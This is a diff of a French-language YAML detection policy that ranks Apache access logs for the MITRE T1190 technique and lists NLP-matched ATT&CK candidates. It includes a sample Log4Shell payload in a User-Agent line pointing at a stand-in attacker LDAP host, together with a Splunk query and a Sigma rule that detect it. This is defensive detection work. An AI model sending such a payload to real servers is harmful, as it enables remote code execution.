@@ -1,5 +1,5 @@
 policy:
-  name: "Politique priorisée pour T1190"
+  name: "Politique priorisée depuis scénario — T1190"
   target:
     threat_id: "T1190"
     ttp_id: "T1190"
@@ -13,6 +13,8 @@ policy:
     retention_days: "30"
     asset_notes: "Actif prioritaire pour T1190 et CVE web critiques"
     strategy: "balanced"
+    scenario: "Exploit public facing application log4j apache web request payload"
+    selected_ttp_id: "T1190"
   decision_model:
     name: "Threat-to-Log Value Engine"
     principle: "Prioriser les logs selon menace, criticité de l'actif, couverture, coût et bruit."
@@ -20,6 +22,8 @@ policy:
       - "indispensable"
       - "recommandé"
       - "optionnel"
+    mode: "scenario_to_policy_mvp"
+    nlp_layer: "similarité texte légère sur MITRE ATT&CK Enterprise"
   recommendations:
     -
       log_source: "Apache Access Logs"
@@ -33,7 +37,7 @@ policy:
       estimated_cost: "faible"
       estimated_noise: "moyen"
       detection_coverage: "forte"
-      reason: "Apache Access Logs est classé indispensable pour T1190 car cette source permet d'observer HttpRequest, UserAgent, Payload sur un actif de type web_server avec une criticité high."
+      reason: "Sélection via NLP depuis le scénario utilisateur. Apache Access Logs est classé indispensable pour T1190 car cette source permet d'observer HttpRequest, UserAgent, Payload sur un actif de type web_server avec une criticité high."
       blind_spot_if_missing: "Angle mort potentiel : sans Apache Access Logs, l'équipe risque de moins bien détecter les comportements associés à T1190, notamment les signaux portés par HttpRequest, UserAgent, Payload."
       covers:
         ttp_id: "T1190"
@@ -46,3 +50,66 @@ policy:
         sample_log: "User-Agent: ${jndi:ldap://attacker.com/exploit}"
         splunk_query: "index=* sourcetype=access_* \\${jndi:\\\" | stats count by src_ip, http_user_agent"
         sigma_rule: "title: Detect Log4Shell Exploitation Attempt\nlogsource:\n  category: web\n  product: apache\ndetection:\n  selection:\n    http_user_agent|contains: '${jndi:'\n  condition: selection"
+  mitre_candidates:
+    -
+      ttp_id: "T1505.003"
+      name: "Web Shell"
+      tactics:
+        - "persistence"
+      data_sources:
+
+      similarity_score: 0.2566
+      matched_terms:
+        - "web"
+      why: "Web Shell ressort car le scénario partage les termes web avec MITRE ATT&CK."
+    -
+      ttp_id: "T1190"
+      name: "Exploit Public-Facing Application"
+      tactics:
+        - "initial-access"
+      data_sources:
+
+      similarity_score: 0.1701
+      matched_terms:
+        - "application"
+        - "exploit"
+        - "facing"
+        - "public"
+        - "web"
+      why: "Exploit Public-Facing Application ressort car le scénario partage les termes application, exploit, facing, public, web avec MITRE ATT&CK."
+    -
+      ttp_id: "T1584.006"
+      name: "Web Services"
+      tactics:
+        - "resource-development"
+      data_sources:
+
+      similarity_score: 0.1665
+      matched_terms:
+        - "web"
+      why: "Web Services ressort car le scénario partage les termes web avec MITRE ATT&CK."
+    -
+      ttp_id: "T1588.005"
+      name: "Exploits"
+      tactics:
+        - "resource-development"
+      data_sources:
+
+      similarity_score: 0.1649
+      matched_terms:
+        - "application"
+        - "exploit"
+        - "facing"
+        - "public"
+      why: "Exploits ressort car le scénario partage les termes application, exploit, facing, public avec MITRE ATT&CK."
+    -
+      ttp_id: "T1606.001"
+      name: "Web Cookies"
+      tactics:
+        - "credential-access"
+      data_sources:
+
+      similarity_score: 0.1584
+      matched_terms:
+        - "web"
+      why: "Web Cookies ressort car le scénario partage les termes web avec MITRE ATT&CK."
